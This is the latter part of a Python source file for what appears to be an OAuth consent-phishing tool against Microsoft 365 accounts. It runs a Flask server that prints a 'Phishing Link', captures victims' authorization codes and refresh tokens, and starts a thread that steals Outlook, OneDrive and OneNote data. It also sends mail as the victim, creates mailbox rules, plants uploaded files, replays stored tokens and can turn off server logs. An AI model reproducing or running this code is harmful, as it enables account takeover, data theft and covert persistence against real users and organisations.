    if arg.upload:
        filepath = pathlib.Path(arg.upload)
        if filepath.exists():
            path = arg.upload
            filename = Path(path).name
            try:
                with open(path, 'rb') as content:
                    requests.put("https://graph.microsoft.com/v1.0/me/drive/root:/" + filename + ":/content", headers={"Authorization":token, "Content-Type":"application/vnd.openxmlformats-officedocument.wordprocessingml.document"}, data = content)
            except Exception as e:
                print(crayons.red("[-] Error: Something went wrong while accessing "+filename+", please try again!", bold=True))
                return
                
            response = requests.get("https://graph.microsoft.com/v1.0/me/drive/root:/" + filename, headers={"Authorization":token})   
   
            if response.status_code == 201 or response.status_code == 200:
                print(crayons.green("[+] File "+filename+" is uploaded!", bold=True))
            else:
                print(crayons.red("[-] File "+filename+"  not uploaded!", bold=True)) 
                print(crayons.red("Error: " + response.json()['error']['message'], bold=True))            
        else:
            if arg.refresh_all is False:
                print(crayons.red("[-] File "+arg.upload+" not exists"))
        return
    
    if arg.send_mail:
        with open(arg.send_mail, 'r') as f:
            mail = f.read()

        sendmail(mail, victimEmail)  
        return 
    
    if arg.create_rules:
        with open(arg.create_rules, 'r') as f:
            rules = f.read()
        createRules(rules)
        return

    if arg.custom_steal is not None:
            
        if "listusers" in arg.custom_steal:
            listusers()
            
        if "checklicence" in arg.custom_steal:    
            checkLicence()
            
        if "outlook" in arg.custom_steal:    
            outlook()
            
        if "onedrive" in arg.custom_steal:    
            onedrive()
            
        if "onenote" in arg.custom_steal:    
            onenote()

    if arg.no_stealing is False and arg.custom_steal is None:     
        listusers()
        checkLicence()
        outlook()
        onedrive()
        onenote()

    directory = folder + '/onedrive/'
    try:
        files_in_directory = os.listdir(directory)
        filtered_files = [file for file in files_in_directory if file.endswith(".doc")]
        for file in filtered_files:
            path_to_file = os.path.join(directory, file)
            os.remove(path_to_file)
    except:
        pass

if arg.refresh_all is not False:
    processes = []
    with ThreadPoolExecutor(max_workers=5) as executor:
        try:
            sql = "SELECT * from Token"
            cur = conn.cursor()
            cur.execute(sql)
            rows = cur.fetchall()
        except:
            print(crayons.red("[-] Database is empty", bold=True))
            exit()
        if not rows:
            print(crayons.red("[-] User's not found in database!", bold=True))
            exit()
        for row in rows:
            refresh_token = row[1] 
            clientId      = row[2] 
            clientSecret  = row[3] 
            processes.append(executor.submit(main, refresh_token, clientId, clientSecret))
            
    for task in as_completed(processes):
        (task.result())

elif arg.refresh_user is not None:
    try:
        sql = "SELECT * from Token where username = ?"
        cur = conn.cursor()
        cur.execute(sql, (arg.refresh_user,))
        rows = cur.fetchall()
    except:
        print(crayons.red("[-] Database is empty!", bold=True))
        exit()
    if not rows:
        print(crayons.red("[-] User not found in database!", bold=True))
        exit()
    for row in rows:
        refresh_token = row[1] 
        clientId      = row[2] 
        clientSecret  = row[3] 
        
        main(refresh_token, clientId, clientSecret)
       
elif arg.run_app is not False:
    APP = flask.Flask(__name__)
    APP.debug = True
    APP.secret_key = 'development'
    SCOPES          = "https://graph.microsoft.com/.default openid offline_access "
    AUTHORITY_URL   = 'https://login.microsoftonline.com/common'
    
    try:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        cert = os.path.dirname(os.path.abspath(sys.argv[0])) + "/server.cert"
        key  = os.path.dirname(os.path.abspath(sys.argv[0])) + "/server.key"
        context.load_cert_chain(cert, key)
    except Exception as e:
        print(crayons.yellow("[!] SSL CERT Error: " + str(e), bold=True))
        print(crayons.yellow("[!] Check if server.cert and server.key exist"))
        context = 'adhoc'
    
    if arg.disable_logs is not False:
        APP.logger.disabled = True
        log = logging.getLogger('werkzeug')
        log.disabled = True
        print(crayons.blue("Logs are disabled!", bold=True))
        
    def createPhishLink():
        params = urllib.parse.urlencode({'response_type': 'code',
                                         'client_id': CLIENTID,
                                         'scope': SCOPES,
                                         'redirect_uri': REDIRECTURL,
                                         'response_mode': 'query'})
        return AUTHORITY_URL + '/oauth2/authorize?' + params
    
    @APP.route('/')
    def home():
        return  flask.render_template('index.html', LOGINURL="/login")
    
    @APP.route('/login')
    def login():
        return flask.redirect(createPhishLink())

    @APP.route('/login/authorized', methods=['GET', 'POST'])
    def authorized():
        try:
            code = flask.request.args['code']
            auth_context = adal.AuthenticationContext('https://login.microsoftonline.com/common', api_version=None)
            response = auth_context.acquire_token_with_authorization_code( code, REDIRECTURL, 'https://graph.microsoft.com/', CLIENTID, CLIENTSECRET)
            refresh_token = response['refreshToken']
            download_thread = threading.Thread(target=main, name="Downloader", args=(refresh_token, CLIENTID, CLIENTSECRET))
            download_thread.start()
            return  flask.redirect(RedirectAfterStealing)
        except Exception as e:
            print(crayons.red("Error: " + str(e), bold=True))
            return  flask.redirect("/")
    
    if __name__ == '__main__':
        try:
            print(crayons.yellow("Phishing Link => ", bold=True) + crayons.green(createPhishLink() + "\n", bold=True))
            if arg.no_ssl == True:
                PORT = 80
                if arg.port is not None:
                    PORT = arg.port
                print(crayons.yellow("Home page running on port: ", bold=True)+crayons.green(PORT, bold=True) + "\n")
                APP.run(host="0.0.0.0", port=PORT, use_reloader=False)
            else:
                PORT = 443
                if arg.port is not None:
                    PORT = arg.port
                print(crayons.yellow("Home page running on port: ", bold=True)+crayons.green(PORT, bold=True) + "\n")
                APP.run(host="0.0.0.0", port=PORT, use_reloader=False,  ssl_context=context)
                
        except Exception as e:
            print(crayons.red("\r\n[-] Permission denied or port " + str(PORT) + " is busy", bold=True))
            print(crayons.red("Error: " + str(e), bold=True))
            
else:
    if arg.refresh_token or arg.token_path or arg.token or arg.code or arg.delete_all_data or arg.delete_user_data:
        main(None,None,None)
    else:
        parser.print_help()
        sys.exit()